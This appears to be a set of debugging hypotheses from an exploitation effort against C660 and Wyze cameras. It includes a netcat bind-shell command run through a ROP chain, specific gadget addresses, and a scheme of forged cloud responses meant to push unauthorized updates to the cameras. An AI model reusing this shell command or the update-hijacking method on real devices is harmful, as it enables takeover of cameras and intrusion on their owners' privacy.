# Hypothesis Slate (Phase 3)

## H-001 — C660 shell: nc -e missing (mechanistic)
**claim:** The C660's ROP chain executes `system("/bin/busybox nc -lk -p 4444 -e /bin/sh")`, port 4444 binds, but the C660's busybox build lacks `-e` (or nc entirely), so the port accepts and immediately closes with no shell attached.
**mechanism:** busybox nc applet variants vary; `-e` is a compile-time config (CONFIG_NC_SERVER/NC_EXTRA). Accept-then-close is the signature of nc without exec support.
**falsifier:** If the decoded C660 rootfs busybox shows `nc` with `-e` support (CONFIG_NC_EXTRA=y) AND telnetd present, this H is refuted and the failure is elsewhere (payload layout).
**expected_evidence:** `strings`/applet list from the decoded C660 rootfs binary showing nc applet flags; presence/absence of telnetd.
**origin:** proposed | **confidence:** high

## H-002 — C660 shell: ROP pivot lands wrong (mechanistic)
**claim:** The gadgets (pop=0x24462 pivot=0x28514e system=0x15928) were derived from a *decoded, possibly relocated* /bin/main, but the running C660 loads a different binary build (version drift), so `system` is invoked at a wrong address → garbage executes → connection accepted by the listen backlog? No — a wrong system address would not bind :4444 at all.
**mechanism:** Non-PIE ET_EXEC has fixed .text, but firmware update drift changes offsets.
**falsifier:** If the C660's running firmware version matches the decoded BCL1 build (build-id/strings match), this H is refuted.
**expected_evidence:** Version strings in decoded rootfs vs camera-reported firmware version.
**origin:** proposed | **confidence:** low

## H-003 — Wyze fetch gap: presigned-URL rejection (mechanistic)
**claim:** Cameras polled get_download_location 10× but never fetched because our forged responses carried `Signature=000...0`; the Wyze SDK validates presigned URLs client-side and drops them before any HTTP GET.
**mechanism:** AWS SigV4 presigned URLs are validated by the SDK (or S3 rejects). A zero signature is not a valid SigV4.
**falsifier:** If camera GETs appear for forged-URL responses (i.e., cameras fetch despite 0-sig), this H is refuted. If cameras fetch immediately after we passthrough real signed URLs, H confirmed.
**expected_evidence:** Forge log: camera-sourced GET /wyzeedgeai... or /wuv2/... within one poll cycle after real-URL responses.
**origin:** proposed | **confidence:** high

## H-004 — THIRD ALTERNATIVE: cameras already flashed/updated or process-channel is a no-op path (boundary)
**claim:** Both leading narratives are wrong: either (a) the cameras are already running newer stock firmware than our delta targets so the OTA never triggers, or (b) the process channel requires the device to *run* launch.sh only after a component-checksum match against its own manifest — meaning without the mirrored real component bytes (which we never mirrored), the checksum gate blocks every install regardless of URL validity.
**mechanism:** Wyze process manager verifies component checksums against its manifest; OTA compares versions.
**falsifier:** If the camera's get_processes request body includes a version newer than ours (or its manifest check passes without mirrored bytes), H refuted.
**expected_evidence:** Camera request bodies in forge logs showing version fields; presence of component checksums in our responses vs camera's manifest requirements.
**origin:** third_alternative | **confidence:** medium
